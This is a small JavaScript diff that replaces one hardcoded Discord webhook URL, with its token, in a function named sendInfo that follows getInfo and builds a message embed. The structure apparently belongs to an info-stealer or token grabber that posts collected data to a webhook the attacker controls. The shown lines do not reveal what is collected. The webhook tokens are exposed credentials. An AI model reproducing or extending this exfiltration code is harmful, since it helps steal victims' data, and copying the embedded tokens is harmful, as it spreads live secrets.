@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1312772778721808436/baPa3VRUFgS8EVt-T8eTvI412rEjkqKAcAMaAQfjOkk4MHdLOAQsJx-EuT4ZtrdgsiS0";webhook
+  const webhook = "https://discord.com/api/webhooks/1309517414144409761/gsZtTkFUe4x9c9Bveynz7D-Z_GmcEM3UD-RE1csTCZfHq1FS-K7dFjVZlMETfkSy9BDW";webhook
 
   const embed = {
     color: 1585803, //#18328bz
